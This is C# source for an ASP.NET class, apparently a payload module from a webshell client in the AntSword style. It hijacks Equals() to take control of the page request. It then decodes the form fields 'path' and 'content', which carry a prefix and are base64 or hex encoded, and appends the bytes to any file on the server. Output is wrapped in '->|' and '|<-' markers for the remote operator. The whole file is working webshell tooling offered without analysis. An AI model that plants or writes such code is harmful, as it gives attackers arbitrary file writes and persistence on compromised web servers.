using System;
using System.IO;
using System.Text;
using System.Web;
using System.Web.UI;

public class UploadFile
{
    public HttpRequest Request;
    public HttpResponse Response;
    public String encoder;
    public String decoder;
    public String cs;
    public String randomPrefix;


    public override bool Equals(object obj)
    {
        Page page = (Page) obj;
        this.Response = page.Response;
        this.Request = page.Request;
        this.cs = "UTF-8";
        this.encoder = "base64";
        this.decoder = "";
        this.randomPrefix = "2";
        String tag_s = "->|";
        String tag_e = "|<-";
        this.Response.Charset = cs;
        String result = "";
        try
        {
            String path = decode(this.Request.Form["path"]);
            String content = decode(this.Request.Form["content"]);
            result += this.UploadFileCode(path,content);
        }
        catch (Exception e)
        {
            result = "ERROR:// " + e.Message;
        }

        this.Response.Write(tag_s + asoutput(result) + tag_e);
        return true;
    }

    public string UploadFileCode(String path,String content)
    {
        byte[] B = new Byte[content.Length / 2];
        for (int i = 0; i < content.Length; i += 2)
        {
            B[i / 2] = (byte) Convert.ToInt32(content.Substring(i, 2), 16);
        }
        
        FileStream fs = new FileStream(path, FileMode.Append);
        fs.Write(B, 0, B.Length);
        fs.Close();
        return "1";
    }

    public String HexAsciiConvert(String hex)
    {
        StringBuilder sb = new StringBuilder();
        int i;
        for (i = 0; i < hex.Length; i += 2)
        {
            sb.Append(System.Convert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i, 2),
                System.Globalization.NumberStyles.HexNumber))));
        }

        return sb.ToString();
    }

    public String decode(String src)
    {
        int prefixlen = 0;
        try
        {
            prefixlen = Int32.Parse(randomPrefix);
            src = src.Substring(prefixlen);
        }
        catch (Exception e)
        {
        }

        String ret;
        try
        {
            switch (encoder)
            {
                case "base64":
                {
                    ret = System.Text.Encoding.GetEncoding(cs).GetString(System.Convert.FromBase64String(src));
                    break;
                }
                case "hex":
                {
                    ret = HexAsciiConvert(src);
                    break;
                }
                default:
                {
                    ret = src;
                    break;
                }
            }
        }
        catch (Exception e)
        {
            ret = e.Message.ToString();
        }

        return ret;
    }

    public String asoutput(String src)
    {
        String ret;
        try
        {
            switch (decoder)
            {
                case "base64":
                {
                    ret = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src));
                    break;
                }
                default:
                {
                    ret = src;
                    break;
                }
            }
        }
        catch (Exception e)
        {
            ret = e.Message.ToString();
        }

        return ret;
    }
}